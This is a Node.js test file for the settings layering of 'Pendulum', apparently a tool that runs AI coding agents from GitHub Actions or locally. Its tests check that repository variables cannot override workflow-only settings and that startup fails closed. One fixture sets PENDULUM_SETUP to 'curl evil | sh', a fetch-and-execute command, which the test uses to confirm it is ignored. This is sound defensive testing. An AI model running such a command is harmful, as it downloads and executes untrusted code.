import "./temp.mjs";
import { test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { createServer } from "node:http";
import { fileURLToPath } from "node:url";
import { WORKFLOW_ONLY_SETTINGS, VARIABLE_SETTINGS, WORKFLOW_SETTINGS, layerLines, resolveInputs, valueProblem, machineSettings, settingLayers, variableSettings } from "../scripts/lib/inputs.mjs";
import { HOT_SETTINGS, Local } from "../scripts/local.mjs";
import { SPENT_GUESS_MS } from "../scripts/lib/holds.mjs";

// A repository's settings in layers: Pendulum's defaults, the workflow's env block, repository variables, this machine (#284).

const LAUNCH = fileURLToPath(new URL("../scripts/launch.mjs", import.meta.url));
const INPUTS = fileURLToPath(new URL("../scripts/lib/inputs.mjs", import.meta.url));

test("settingLayers: each layer over the one below; a variable never sets a setting only the workflow file sets; another harness drops the models below it", () => {
  for (const n of ["CREDENTIAL", "AUTO_MERGE", "NOTIFY", "MAINTAINERS", "PROTECTED_PATHS", "ALLOWED_DOMAINS", "LOCAL_DOMAINS", "WORKER_SECRETS", "LOCAL_ENV", "SANDBOX", "HARNESS_VERSION", "SETUP", "INSTALL", "BUDGET_COMMAND", "LOCAL_SETUP", "LOCAL_DB", "THIRD_PARTY_REVIEWERS", "CI_CHECKS", "PG_BIN", "NODE_VERSION"]) {
    assert.ok(WORKFLOW_ONLY_SETTINGS.has(`PENDULUM_${n}`) && !VARIABLE_SETTINGS.has(`PENDULUM_${n}`), n);
  }
  for (const n of ["MAX_CONCURRENT", "LOCAL_MAX_CONCURRENT", "DAILY_USD", "MAX_USD", "HARNESS", "MODEL", "EFFORT", "VALIDATION", "LOCAL_VALIDATION", "LOCAL_DB_INIT", "SWEEP_MAX_DESTROYS"]) assert.ok(VARIABLE_SETTINGS.has(`PENDULUM_${n}`), n);
  for (const k of VARIABLE_SETTINGS) assert.ok(WORKFLOW_SETTINGS.has(k), `${k} is a setting`);

  assert.deepEqual(variableSettings({ PENDULUM_MAX_USD: "5", pendulum_daily_usd: "40", PENDULUM_AUTO_MERGE: "false", PENDULUM_APP_TOKEN: "x", PENDULUM_MODEL: "", OTHER: "y" }), {
    kept: { PENDULUM_MAX_USD: "5", PENDULUM_DAILY_USD: "40" },
    excluded: ["PENDULUM_AUTO_MERGE"],
    unknown: ["PENDULUM_APP_TOKEN"],
    invalid: [],
  });
  // A value the env block's parsing would not take as given is named and ignored, never applied.
  const bad = variableSettings({ PENDULUM_MAX_CONCURRENT: "2.5", PENDULUM_MAX_USD: "lots", PENDULUM_DAILY_USD: "-1", PENDULUM_HARNESS: " Codex ", PENDULUM_RESUME_POLICY: "always", PENDULUM_PROMPT_CACHE_TTL: "1H", PENDULUM_LOCAL_MAX_CONCURRENT: "0", PENDULUM_VALIDATION: "anything goes" });
  assert.deepEqual(bad.kept, { PENDULUM_HARNESS: "codex", PENDULUM_PROMPT_CACHE_TTL: "1H", PENDULUM_VALIDATION: "anything goes" }, "a harness as resolveInputs reads it");
  assert.deepEqual(variableSettings({ PENDULUM_HARNESS: "co dex" }).invalid.map((x) => x.why), ["not claude, codex, copilot"]);
  assert.deepEqual(bad.invalid.map((x) => `${x.name} ${x.why}`), [
    "PENDULUM_DAILY_USD not a number, 0 or more",
    "PENDULUM_LOCAL_MAX_CONCURRENT not a whole number above 0",
    "PENDULUM_MAX_CONCURRENT not a whole number above 0",
    "PENDULUM_MAX_USD not a number, 0 or more",
    "PENDULUM_RESUME_POLICY not fresh, fix-passes",
  ]);
  assert.equal(settingLayers({ workflow: { PENDULUM_MAX_USD: "25" }, variables: { PENDULUM_MAX_USD: "lots" } }).values.PENDULUM_MAX_USD, "25");
  assert.ok(layerLines(settingLayers({ variables: { PENDULUM_MAX_USD: "lots" } })).includes('repository variable PENDULUM_MAX_USD "lots" ignored: not a number, 0 or more'));

  const workflow = { PENDULUM_HARNESS: "claude", PENDULUM_MODEL: "claude-opus-5-5", PENDULUM_MAX_USD: "25", PENDULUM_LOCAL_MAX_CONCURRENT: "1", PENDULUM_SETUP: "" };
  const l = settingLayers({ workflow, variables: { PENDULUM_MAX_USD: "10", PENDULUM_LOCAL_MAX_CONCURRENT: "2", PENDULUM_SETUP: "curl evil | sh" }, machine: machineSettings({ PENDULUM_LOCAL_MAX_CONCURRENT: "4", PENDULUM_MAX_USD: "99", PENDULUM_LOCAL_TOKEN: "t" }) });
  assert.deepEqual(l.values, { PENDULUM_HARNESS: "claude", PENDULUM_MODEL: "claude-opus-5-5", PENDULUM_MAX_USD: "10", PENDULUM_LOCAL_MAX_CONCURRENT: "4", PENDULUM_SETUP: "" });
  assert.deepEqual(l.from, { PENDULUM_HARNESS: "workflow", PENDULUM_MODEL: "workflow", PENDULUM_MAX_USD: "variable", PENDULUM_LOCAL_MAX_CONCURRENT: "machine", PENDULUM_SETUP: "workflow" });
  assert.deepEqual(l.excluded, ["PENDULUM_SETUP"], "named, and ignored");

  // The workflow's models belong to its harness: a variable that picks another drops them, unless it sets its own.
  assert.deepEqual(settingLayers({ workflow, variables: { PENDULUM_HARNESS: "codex" } }).values.PENDULUM_MODEL, undefined);
  assert.equal(settingLayers({ workflow, variables: { PENDULUM_HARNESS: "codex", PENDULUM_MODEL: "gpt-x" } }).values.PENDULUM_MODEL, "gpt-x");
  assert.equal(settingLayers({ workflow, variables: { PENDULUM_HARNESS: "Claude" } }).values.PENDULUM_MODEL, "claude-opus-5-5", "the same harness keeps them");

  const lines = layerLines(l);
  assert.deepEqual(lines.slice(0, 4), ['PENDULUM_HARNESS: "claude" (workflow)', 'PENDULUM_LOCAL_MAX_CONCURRENT: "4" (this machine)', 'PENDULUM_MAX_USD: "10" (repository variable)', 'PENDULUM_MODEL: "claude-opus-5-5" (workflow)']);
  assert.match(lines[4], /^Pendulum's defaults: .*PENDULUM_DAILY_USD, .*PENDULUM_SETUP, /, "an empty workflow value reads as the default");
  assert.equal(lines[5], "repository variable PENDULUM_SETUP ignored: only the reviewed workflow file sets it");
});

/** Runs `code` in a fresh Node process with `env` (its PENDULUM_* settings as the workflow's env block on Actions), as action.yml's run step starts a script. */
function onActions(code, env) {
  return execFileSync(process.execPath, ["--input-type=module", "-e", code], { encoding: "utf8", env: { PATH: process.env.PATH, HOME: process.env.HOME, TMPDIR: process.env.TMPDIR, GITHUB_ACTIONS: "true", ...env } });
}

test("#402: rebase_limit is a cap a repository variable may set (a whole number above 0); third_party_wait_minutes gates a merge, so only the workflow file sets it", () => {
  assert.ok(VARIABLE_SETTINGS.has("PENDULUM_REBASE_LIMIT"));
  assert.deepEqual(variableSettings({ PENDULUM_REBASE_LIMIT: "3" }).kept, { PENDULUM_REBASE_LIMIT: "3" });
  for (const bad of ["0", "2.5", "many"]) assert.deepEqual(variableSettings({ PENDULUM_REBASE_LIMIT: bad }).invalid.map((x) => x.why), ["not a whole number above 0"], bad);
  assert.ok(WORKFLOW_ONLY_SETTINGS.has("PENDULUM_THIRD_PARTY_WAIT_MINUTES"));
  assert.deepEqual(variableSettings({ PENDULUM_THIRD_PARTY_WAIT_MINUTES: "1" }).excluded, ["PENDULUM_THIRD_PARTY_WAIT_MINUTES"]);
  const layers = settingLayers({ workflow: { PENDULUM_THIRD_PARTY_WAIT_MINUTES: "30" }, variables: { PENDULUM_REBASE_LIMIT: "3", PENDULUM_THIRD_PARTY_WAIT_MINUTES: "1" } });
  assert.deepEqual([layers.values.PENDULUM_REBASE_LIMIT, layers.from.PENDULUM_REBASE_LIMIT, layers.values.PENDULUM_THIRD_PARTY_WAIT_MINUTES, layers.from.PENDULUM_THIRD_PARTY_WAIT_MINUTES], ["3", "variable", "30", "workflow"]);
  assert.ok(layerLines(layers).includes('PENDULUM_REBASE_LIMIT: "3" (repository variable)'), "doctor and serve print the value in force and its layer");
  // guess_hours: a list of hours, each above 0, on every route; a variable may set it.
  assert.deepEqual(variableSettings({ PENDULUM_GUESS_HOURS: "2, 6 48" }).kept, { PENDULUM_GUESS_HOURS: "2, 6 48" });
  for (const bad of ["0, 4", "1, soon", "1, 193", "1e10"]) assert.deepEqual(variableSettings({ PENDULUM_GUESS_HOURS: bad }).invalid.map((x) => x.why), ["not a list of hours, each a number above 0, at most 192"], bad);
  assert.deepEqual(variableSettings({ PENDULUM_GUESS_HOURS: "1, 192" }).kept, { PENDULUM_GUESS_HOURS: "1, 192" }, "the longest hold a record keeps, 8 days, is the longest step");
  assert.deepEqual(resolveInputs({ env: { PENDULUM_GUESS_HOURS: "1e10" } }).guessMs, SPENT_GUESS_MS, "past it: the default");
  // third_party_wait_minutes: at most 24 hours; past it, the default.
  assert.equal(valueProblem("PENDULUM_THIRD_PARTY_WAIT_MINUTES", "1441"), "not a number above 0, at most 1440 (24 hours)");
  assert.equal(valueProblem("PENDULUM_THIRD_PARTY_WAIT_MINUTES", "1440"), null);
  assert.equal(resolveInputs({ env: { PENDULUM_THIRD_PARTY_WAIT_MINUTES: "1e12" } }).thirdPartyWaitMs, 20 * 60_000);
  assert.equal(resolveInputs({ env: { PENDULUM_THIRD_PARTY_WAIT_MINUTES: "1440" } }).thirdPartyWaitMs, 1440 * 60_000);
  assert.deepEqual(resolveInputs({ env: { PENDULUM_GUESS_HOURS: "2, 6 48" } }).guessMs, [2, 6, 48].map((h) => h * 3600_000));
  assert.deepEqual(resolveInputs({ env: {} }).guessMs, SPENT_GUESS_MS, "Pendulum's default is holds.mjs's");
  assert.deepEqual(resolveInputs({ env: { PENDULUM_GUESS_HOURS: "-1" } }).guessMs, SPENT_GUESS_MS);
  // serve takes a change of either at its next tick, as it does the other scheduling settings.
  for (const k of ["PENDULUM_REBASE_LIMIT", "PENDULUM_GUESS_HOURS"]) assert.ok(HOT_SETTINGS.includes(k), k);
});

test("on Actions the workflow's `vars` input lays the repository's variables over the env block before any script reads a setting, and the launcher hands them to the cloud sandbox's stage (#284)", () => {
  const block = { PENDULUM_HARNESS: "claude", PENDULUM_MODEL: "claude-opus-5-5", PENDULUM_MAX_CONCURRENT: "3", PENDULUM_MAX_USD: "25", PENDULUM_TIMEOUT_MINUTES: "240", PENDULUM_AUTO_MERGE: "true" };
  const vars = { PENDULUM_MAX_CONCURRENT: "6", PENDULUM_MAX_USD: "10", PENDULUM_AUTO_MERGE: "false", PENDULUM_TIMEOUT_MINUTES: "300", ANTHROPIC_OIDC_EXCHANGE_URL: "https://x" };
  const code = `const { stageEnvironment } = await import(${JSON.stringify(LAUNCH)});
const { resolveInputs } = await import(${JSON.stringify(INPUTS)});
const inputs = resolveInputs({ args: { repo: "o/r" } });
const stage = stageEnvironment({ inputs, stage: "work", issue: 7, claim: "c", tokens: { write: "w" } });
console.log(JSON.stringify({ left: process.env.PENDULUM_INPUT_VARS ?? null, inputs: { maxConcurrent: inputs.maxConcurrent, maxUsd: inputs.maxUsd, autoMerge: inputs.autoMerge, timeoutMinutes: inputs.timeoutMinutes, model: inputs.model }, stage: { max: stage.PENDULUM_MAX_CONCURRENT, usd: stage.PENDULUM_MAX_USD, merge: stage.PENDULUM_AUTO_MERGE, vars: Object.keys(stage).filter((k) => k.endsWith("_VARS")) } }));`;
  const out = onActions(code, { ...block, PENDULUM_INPUT_VARS: JSON.stringify(vars) });
  const result = JSON.parse(out.trim().split("\n").at(-1));
  assert.deepEqual(result, {
    left: null,
    inputs: { maxConcurrent: 6, maxUsd: 10, autoMerge: true, timeoutMinutes: 240, model: "claude-opus-5-5" },
    stage: { max: "6", usd: "10", merge: "true", vars: [] },
  });
});

/**
 * A GitHub whose variables lists (the repository's, and the organization's it shares) answer `answer(path)`: {status},
 * or {vars}. Returns the server's URL, its requests, and close.
 */
async function variablesHost(answer) {
  const asked = [];
  const server = createServer((req, res) => {
    const path = new URL(req.url, "http://x").pathname;
    asked.push(path);
    const a = answer(path);
    if (a.status) return res.writeHead(a.status, { "content-type": "application/json" }).end(JSON.stringify({ message: "Resource not accessible by personal access token" }));
    res.writeHead(200, { "content-type": "application/json" }).end(JSON.stringify({ total_count: 1, variables: Object.entries(a.vars).map(([name, value]) => ({ name, value })) }));
  });
  await new Promise((ok) => server.listen(0, "127.0.0.1", ok));
  return { url: `http://127.0.0.1:${server.address().port}`, asked, close: () => new Promise((ok) => server.close(ok)) };
}

async function withApi(url, fn) {
  const before = process.env.GITHUB_API_URL;
  process.env.GITHUB_API_URL = url;
  const lines = [];
  const write = process.stdout.write;
  process.stdout.write = (chunk, ...rest) => (lines.push(String(chunk)), write.call(process.stdout, chunk, ...rest));
  try {
    await fn();
  } finally {
    process.stdout.write = write;
    if (before === undefined) delete process.env.GITHUB_API_URL;
    else process.env.GITHUB_API_URL = before;
  }
  return lines.join("");
}

test("serve's start fails closed: no stage starts on the workflow's values alone until a read of the variables gets through or GitHub says the token may not; run stops after three tries (#284)", async () => {
  const { resetNetwork } = await import("../scripts/lib/network.mjs");
  let failing = 2;
  let refused = false;
  const host = await variablesHost((path) => {
    if (path.endsWith("/organization-variables")) return { vars: { PENDULUM_DAILY_USD: "1", OTHER: "x" } };
    if (refused) return { status: 404 };
    return failing-- > 0 ? { status: 401 } : { vars: { PENDULUM_MAX_CONCURRENT: "1" } };
  });
  const start = () => Object.assign(Object.create(Local.prototype), { repo: { owner: "o", name: "r", full: "o/r" }, repoFull: "o/r", token: "t", startVariablesMs: 1, workflowWf: { PENDULUM_MAX_CONCURRENT: "4" } });
  try {
    let loop = start();
    const text = await withApi(host.url, () => loop.startVariables({ serve: true }));
    assert.deepEqual(host.asked, ["/repos/o/r/actions/variables", "/repos/o/r/actions/variables", "/repos/o/r/actions/variables", "/repos/o/r/actions/organization-variables"]);
    assert.deepEqual(loop.variables, { PENDULUM_MAX_CONCURRENT: "1" }, "the cap the variable lowered holds from the first stage");
    assert.match(text, /the local token was refused \(401\): replace it in \S+tokens\/o\/r; no stage starts until a read gets through/);
    assert.equal(text.split("the repository's variables could not be read").length - 1, 1, "the failure is said once");
    assert.match(text, /organization variable PENDULUM_DAILY_USD is not supported: Pendulum's settings take the repository's own variables only, so local mode ignores it, while on Actions it reaches the jobs unless the repository sets the same name/);
    loop.startSettings();
    assert.equal(loop.wf.PENDULUM_MAX_CONCURRENT, "1");

    // `run`: three failed reads, and nothing starts.
    failing = 10;
    loop = start();
    await withApi(host.url, () => assert.rejects(loop.startVariables(), /^Error: reading the repository's variables failed 3 times \(GET .*\(401\).*\); nothing was started, run it again$/));

    // A token without Variables: read is no failure: one read, the workflow's values, said with the fix.
    refused = true;
    host.asked.length = 0;
    loop = start();
    const said = await withApi(host.url, () => loop.startVariables({ serve: true }));
    assert.deepEqual(host.asked, ["/repos/o/r/actions/variables"]);
    assert.match(said, /cannot read this repository's variables \(HTTP 404\)/);
    loop.startSettings();
    assert.equal(loop.wf.PENDULUM_MAX_CONCURRENT, "4");
  } finally {
    resetNetwork();
    await host.close();
  }
});

test("serve's start on a refused token (401): named, with where to replace it, every third wait; never the workflow's values; a token replaced there is taken (#284)", async () => {
  const { resetNetwork } = await import("../scripts/lib/network.mjs");
  let refusals = 7;
  const auth = [];
  const server = createServer((req, res) => {
    const path = new URL(req.url, "http://x").pathname;
    if (path.endsWith("/actions/variables")) auth.push(req.headers.authorization);
    const ok = path.endsWith("/organization-variables") || req.headers.authorization === "Bearer fresh" || refusals-- <= 0;
    if (!ok) return res.writeHead(401, { "content-type": "application/json" }).end(JSON.stringify({ message: "Bad credentials" }));
    res.writeHead(200, { "content-type": "application/json" }).end(JSON.stringify({ total_count: 1, variables: path.endsWith("/organization-variables") ? [] : [{ name: "PENDULUM_MAX_USD", value: "3" }] }));
  });
  await new Promise((ok) => server.listen(0, "127.0.0.1", ok));
  const url = `http://127.0.0.1:${server.address().port}`;
  const start = () => Object.assign(Object.create(Local.prototype), { repo: { owner: "o", name: "r", full: "o/r" }, repoFull: "o/r", token: "t", startVariablesMs: 1, workflowWf: { PENDULUM_MAX_USD: "25" } });
  try {
    let loop = start();
    const text = await withApi(url, () => loop.startVariables({ serve: true }));
    const line = /the local token was refused \(401\): replace it in [^;]+; no stage starts until a read gets through/g;
    assert.equal(text.match(line).length, 3, "seven refusals: said at the first, fourth and seventh wait");
    assert.doesNotMatch(text, /\[pendulum\] the local token cannot read this repository's variables/, "no fallback to the workflow's values");
    assert.deepEqual(loop.variables, { PENDULUM_MAX_USD: "3" });

    // A token replaced in its source meanwhile is the one the next try reads with.
    refusals = 100;
    auth.length = 0;
    process.env.PENDULUM_LOCAL_TOKEN = "fresh";
    loop = start();
    await withApi(url, () => loop.startVariables({ serve: true }));
    assert.deepEqual(auth, ["Bearer t", "Bearer fresh"]);
    assert.equal(loop.token, "fresh");
  } finally {
    delete process.env.PENDULUM_LOCAL_TOKEN;
    resetNetwork();
    await new Promise((ok) => server.close(ok));
  }
});
